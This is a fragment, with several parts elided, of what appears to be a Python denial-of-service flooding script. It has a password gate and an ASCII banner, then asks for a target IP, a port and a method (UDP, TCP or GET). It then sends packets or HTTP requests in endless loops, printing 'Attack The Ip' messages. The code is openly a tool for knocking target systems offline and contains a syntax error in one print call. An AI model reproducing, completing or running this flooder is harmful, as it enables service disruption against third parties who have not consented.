...
for i in range(3):
	...
	if(pwd==password):
		time.sleep(3)
		print("\033[91m===> Correct Password !! ")
		break
	else:
		time.sleep(5)
		...
		continue
time.sleep(3)
print("\033[91m> you have too many wrong passwords!")
os.system("clear")
...
█▄▄ █▄█   ░█░ ██▄ █▀█ █░▀░█ ▄█
      ...
      | UDP | TCP | GET |
""")
ip = str(input("\033[94m Target Ip \033[1;31;40m  ====> : "))
port = int(input(" \033[94mTarget Port \033[1;31;40m====> : "))
choice = str(input(" \033[94mSelect Methods UDP,TCP,GET \033[1;31;40m     ====> : "))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;40m Attack The Ip %s \033[33mIn Port %s"%(ip,port))
		except:
			print("\033[0;37;40m Attack The Ip %s In Port %s"%(ip,port))
    ...
    while True:
        try:
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("\033[1;36;40m Attack The Ip %s In Port %s"%(ip,port))
        except socket.error:
            s.close()
            print("\033[1;36;40m Attack The Ip %s In Port %s"%(ip,port))
